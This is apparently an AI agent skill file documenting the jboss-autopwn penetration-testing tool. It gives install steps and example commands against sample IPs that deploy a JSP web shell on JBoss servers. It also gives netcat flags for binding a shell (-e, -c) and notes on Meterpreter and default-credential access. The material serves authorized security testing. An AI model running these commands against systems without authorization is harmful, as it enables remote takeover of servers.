---
name: jboss-autopwn
description: Automate the exploitation of JBoss Application Servers to obtain remote shell access. The tool deploys a JSP shell via the JBoss management interface and provides interactive sessions, including support for bind/reverse shells and Meterpreter. Use when encountering JBoss AS instances during web application testing or internal penetration tests to gain initial access or escalate privileges.
---

# jboss-autopwn

## Overview
jboss-autopwn is a script designed to obtain remote shell access on JBoss Application Servers. It works by deploying a malicious JSP shell (WAR file) onto the target server. Once deployed, it enables command execution and file uploads to facilitate an interactive session. It supports Linux, Windows, and Mac targets, with specific capabilities for Meterpreter and VNC on Windows. Category: Web Application Testing / Exploitation.

## Installation (if not already installed)
The tool is typically pre-installed on Kali Linux. If missing:

```bash
sudo apt update && sudo apt install jboss-autopwn
```
**Dependencies:** `curl`, `metasploit-framework`.

## Common Workflows

### Exploit a Linux JBoss Server
Targeting a JBoss instance on a specific IP and port to gain a shell:
```bash
jboss-linux 192.168.1.200 8080
```

### Exploit a Windows JBoss Server
Targeting a Windows-based JBoss instance:
```bash
jboss-win 192.168.1.200 8080
```

### Silent Execution
Redirecting stderr to suppress connection noise or non-critical errors during the exploitation phase:
```bash
jboss-linux 192.168.1.200 8080 2> /dev/null
```

## Complete Command Reference

The tool provides two primary wrappers: `jboss-linux` and `jboss-win`. Both scripts accept the target host and port as positional arguments and utilize an internal version of netcat for session handling.

### Usage
```bash
jboss-linux <target-ip> <port>
jboss-win <target-ip> <port>
```

### Netcat Options (Internal Session Handler)
When the script establishes the connection, it uses the following options for the interactive session:

| Flag | Description |
|------|-------------|
| `-c <shell commands>` | Use `/bin/sh` to execute specified commands after connect |
| `-e <filename>` | Program to execute after connect (e.g., `/bin/bash` or `cmd.exe`) |
| `-b` | Allow broadcasts |
| `-g <gateway>` | Source-routing hop point[s], up to 8 |
| `-G <num>` | Source-routing pointer: 4, 8, 12, ... |
| `-h` | Display help |
| `-i <secs>` | Delay interval for lines sent, ports scanned |
| `-k` | Set keepalive option on socket |
| `-l` | Listen mode, for inbound connects |
| `-n` | Numeric-only IP addresses, no DNS resolution |
| `-o <file>` | Hex dump of traffic to a file |
| `-p <port>` | Local port number |
| `-r` | Randomize local and remote ports |
| `-q <secs>` | Quit after EOF on stdin and delay of specified seconds |
| `-s <addr>` | Local source address |
| `-T <tos>` | Set Type Of Service |
| `-t` | Answer TELNET negotiation |
| `-u` | UDP mode |
| `-v` | Verbose output (use twice for more verbosity) |
| `-w <secs>` | Timeout for connects and final net reads |
| `-C` | Send CRLF as line-ending |
| `-z` | Zero-I/O mode (used for scanning) |

## Notes
- **Targeting:** Ensure you use the correct script (`jboss-linux` vs `jboss-win`) corresponding to the target OS for successful shell execution.
- **Metasploit Integration:** The tool can leverage Metasploit payloads for more advanced post-exploitation (Meterpreter/VNC).
- **Success Rate:** Exploitation depends on the JBoss management console (usually `/jmx-console` or `/admin-console`) being accessible without authentication or with default credentials.